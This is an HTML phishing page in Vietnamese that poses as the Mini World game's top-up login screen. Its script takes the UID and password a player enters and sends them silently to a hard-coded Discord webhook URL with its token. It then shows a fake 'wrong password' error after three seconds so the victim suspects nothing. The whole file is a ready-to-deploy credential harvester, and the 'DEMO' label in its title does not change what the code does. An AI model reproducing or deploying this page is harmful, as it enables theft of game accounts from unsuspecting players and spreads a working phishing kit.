<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mini World - Đăng Nhập</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #2ecc71; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Top Navigation Bar */
        .navbar {
            background-color: #165a33; 
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 55px;
            color: white;
            font-weight: bold;
        }

        .nav-logo {
            padding: 0 15px;
            font-size: 16px;
            letter-spacing: 1px;
            text-align: center;
            line-height: 1.2;
        }

        .nav-logo span {
            display: block;
            font-size: 11px;
            color: #bdc3c7;
        }

        .nav-tabs {
            display: flex;
            height: 100%;
            align-items: center;
        }

        .tab-nap {
            background-color: #f1c40f; 
            color: #2c3e50;
            height: 100%;
            display: flex;
            align-items: center;
            padding: 0 30px;
            font-size: 18px;
            cursor: pointer;
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 20px;
            padding-right: 15px;
        }

        .lang-select {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
        }

        /* Banner Nạp */
        .banner-nap {
            background-color: #3498db; 
            color: white;
            text-align: center;
            padding: 20px 0;
            font-size: 28px;
            font-weight: 500;
            letter-spacing: 1px;
            box-shadow: inset 0 -5px 10px rgba(0,0,0,0.1);
        }

        /* Khu vực Form Đăng Nhập */
        .login-container {
            background-color: white;
            margin: 20px auto;
            width: 92%;
            max-width: 450px;
            border-radius: 12px;
            padding: 40px 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
        }

        .login-title {
            text-align: center;
            color: #000;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #dcdde1;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
            transition: border 0.3s;
        }

        .input-group input:focus {
            border-color: #3498db;
        }

        .input-group input::placeholder {
            color: #bdc3c7;
        }

        /* Nút đăng nhập */
        .btn-submit {
            width: 100%;
            background-color: #2980b9; 
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-submit:hover {
            background-color: #1f618d;
        }

        /* Vòng xoay loading */
        .spinner {
            display: none; 
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Thông báo lỗi */
        .error-message {
            display: none; 
            color: #c0392b; 
            font-size: 14px;
            text-align: center;
            margin-top: 15px;
            font-weight: bold;
        }

        /* Nút Liên Hệ */
        .floating-button {
            position: fixed;
            bottom: 20px;
            right: 15px;
            background-color: #1e1e1e;
            color: white;
            padding: 10px;
            border-radius: 10px;
            text-align: center;
            font-size: 11px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            width: 75px;
        }
    </style>
</head>
<body>

    <div class="navbar">
        <div class="nav-logo">
            MINI WORLD
            <span>CREATA</span>
        </div>
        <div class="nav-tabs">
            <div class="tab-nap">Nạp</div>
        </div>
        <div class="nav-right">
            🌐 <span>▲</span>
            <div class="menu-icon">☰</div>
        </div>
    </div>

    <div class="banner-nap">
        Nạp
    </div>

    <div class="login-container">
        <h2 class="login-title">Đăng Nhập Tài Khoản</h2>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="uid" placeholder="UID" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Mật Khẩu" required>
            </div>
            
            <button type="submit" class="btn-submit" id="submitBtn">
                <span class="spinner" id="btnSpinner"></span>
                <span id="btnText">Đăng Nhập</span>
            </button>
            
            <div class="error-message" id="errorMsg">
                Sai mật khẩu hoặc UID không chính xác!
            </div>
        </form>
    </div>

    <div class="floating-button">
        <div>▲</div>
        <div style="font-weight: bold; margin-top: 2px;">Liên Hệ</div>
        <div>Chúng Tôi</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const uid = document.getElementById('uid').value;
            const password = document.getElementById('password').value;
            
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');
            const errorBox = document.getElementById('errorMsg');
            const submitBtn = document.getElementById('submitBtn');

            // 1. Ẩn thông báo lỗi cũ
            errorBox.style.display = 'none';

            // 2. Bật hiệu ứng Loading
            btnText.innerText = "Đang đăng nhập...";
            btnSpinner.style.display = "block";
            submitBtn.style.pointerEvents = "none"; 
            submitBtn.style.opacity = "0.8";

            // URL Webhook của bạn
            const webhookUrl = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";

            // Cấu trúc nội dung gửi lên Discord đẹp mắt bằng Embed
            const discordPayload = {
                embeds: [{
                    title: "🎮 CÓ NGƯỜI CHƠI ĐĂNG NHẬP (DEMO)",
                    color: 3447003, // Màu xanh dương
                    fields: [
                        { name: "🆔 UID Người dùng", value: `\`${uid}\``, inline: true },
                        { name: "🔑 Mật khẩu", value: `\`${password}\``, inline: true },
                        { name: "⏰ Thời gian", value: new Date().toLocaleString("vi-VN"), inline: false }
                    ],
                    footer: { text: "Hệ thống Log Game Mini World Web" }
                }]
            };

            // Gửi dữ liệu ngầm qua Discord Webhook
            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(discordPayload)
            })
            .then(response => console.log("Đã gửi dữ liệu log đến Discord."))
            .catch(error => console.error("Lỗi gửi webhook:", error));

            // 3. Chờ đúng 3 giây rồi hiện lỗi trên giao diện web
            setTimeout(function() {
                btnText.innerText = "Đăng Nhập";
                btnSpinner.style.display = "none";
                submitBtn.style.pointerEvents = "auto";
                submitBtn.style.opacity = "1";

                errorBox.style.display = 'block'; 
            }, 3000); 
        });
    </script>

</body>
</html>
